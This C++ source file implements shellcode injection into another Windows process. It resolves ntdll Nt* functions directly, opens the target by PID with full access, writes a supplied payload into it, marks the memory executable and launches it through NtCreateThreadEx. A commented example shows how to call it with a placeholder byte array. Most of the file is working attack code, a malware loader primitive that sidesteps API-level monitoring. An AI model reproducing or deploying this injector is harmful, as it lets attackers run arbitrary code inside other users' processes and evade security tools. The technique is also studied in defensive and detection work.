#include <iostream>
#include <windows.h>
#include "inj.h"

using namespace std;


bool InjShellcodeViaCRT(int PID, BYTE* ShCode, SIZE_T size) {
	// modify here if problems
	BYTE* EShCode = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(EShCode, ShCode, size);
	HMODULE HNT = GetModuleHandleA("ntdll.dll");
	FARPROC NtProcessPtr = GetProcAddress(HNT, "NtOpenProcess");
	FARPROC NtAllocPtr = GetProcAddress(HNT, "NtAllocateVirtualMemory");
	FARPROC NtWritePtr = GetProcAddress(HNT, "NtWriteVirtualMemory");
	FARPROC NtProtPtr = GetProcAddress(HNT, "NtProtectVirtualMemory");
	FARPROC NtCreateThreadExPtr = GetProcAddress(HNT, "NtCreateThreadEx");

	typedef NTSTATUS(NTAPI* NtOpenProcess_t)(
		PHANDLE ProcessHandle,
		ACCESS_MASK DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		PCLIENT_ID PclientId
		);

	typedef NTSTATUS(NTAPI* NtAllocVirtualMemory_t)(
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		ULONG_PTR ZeroBits,
		PSIZE_T RegionSize,
		ULONG AllocationType,
		ULONG Protect
		);

	typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
		HANDLE ProcessHandle,
		PVOID BaseAddress,
		PVOID Buffer,
		SIZE_T NumberOfBytesToWrite,
		PSIZE_T NumberOfBytesWritten
		);
	typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAtrributes,
		HANDLE ProcessHandle,
		PVOID StartRoutine,
		PVOID Argument,
		ULONG CreateFlags,
		SIZE_T Zerobits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		PVOID AttributeList
		);

	typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		PSIZE_T RegionSize,
		ULONG NewProtection,
		PULONG OldProtection
		);

	NtAllocVirtualMemory_t PntAllocVirtualMemory = (NtAllocVirtualMemory_t)NtAllocPtr;
	NtOpenProcess_t PntOpenProcess_t = (NtOpenProcess_t)NtProcessPtr;
	NtWriteVirtualMemory_t PntWriteVirtualMemory = (NtWriteVirtualMemory_t)NtWritePtr;
	NtCreateThreadEx_t PntCreateThreadEx = (NtCreateThreadEx_t)NtCreateThreadExPtr;
	NtProtectVirtualMemory_t PntProtectVirtualMemory = (NtProtectVirtualMemory_t)NtProtPtr;

	CLIENT_ID client_id;
	client_id.UniqueProcess = (HANDLE)PID;
	client_id.UniqueThread = NULL;

	OBJECT_ATTRIBUTES objAttr;
	ZeroMemory(&objAttr, sizeof(objAttr));
	objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
	HANDLE hProcess;

	NTSTATUS Openstatus = PntOpenProcess_t(&hProcess,
		PROCESS_ALL_ACCESS,
		&objAttr,
		&client_id);
	if (Openstatus == 0) {
		cout << "Successfully Opened A Process\n";

		//allocate
		PVOID remotebase = NULL;
		ULONG_PTR ad = 0;

		NTSTATUS Alloc1status = PntAllocVirtualMemory(hProcess,
			&remotebase,
			ad,
			&size,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);
		void* scBase = remotebase;

		if (Alloc1status == 0) {
			cout << "Sucessfuly Allocated Memory\n";
			cout << "[debug] remotebase = " << hex << remotebase << endl;
			SIZE_T written = 0;
			NTSTATUS Write1status = PntWriteVirtualMemory(hProcess,
				remotebase,
				EShCode,
				size,
				&written);
			if (Write1status == 0) {
				cout << "ShellCode Blob successfully Written\n";

				ULONG old;
				NTSTATUS protstatus = PntProtectVirtualMemory(hProcess,
					&remotebase,
					&size,
					PAGE_EXECUTE_READ,
					&old);
				
				if (protstatus == 0) {
					cout << "Protected Shellcode memory\n";
					HANDLE Hthread;
					NTSTATUS Thread2status = PntCreateThreadEx(&Hthread,
						THREAD_ALL_ACCESS,
						NULL,
						hProcess,
						remotebase,
						NULL, 0, 0, 0, 0,
						NULL);
					if (Thread2status == 0) {
						cout << "Sucessfuly injected and started thread(Payload ran)\n";
						CloseHandle(hProcess);
						CloseHandle(Hthread);
						return true;
					}
					else {
						cout << "There was an issue = " << hex << Thread2status << endl;
						CloseHandle(hProcess);
						CloseHandle(Hthread);
						return false;

					}
				}
			}
			else {
				cout << "NtWriteVirtualMemory failed: 0x" << hex << Write1status << endl;
				cout << "Bytes written: " << dec << written << endl;
			}

		}
	}
}

int main() {
	//example
	/*BYTE shellcode[] = {
	0x48, 0x31, 0xC9,   
	0x48, 0xB8, 0,0,0,0,0,0,0,0,       
	0xFF, 0xD0                          
	};
	usage: make an array of bytes and pass them into the function
	InjShellcodeViaCRT(11284, shellcode, sizeof(shellcode));*/
	return 0;
}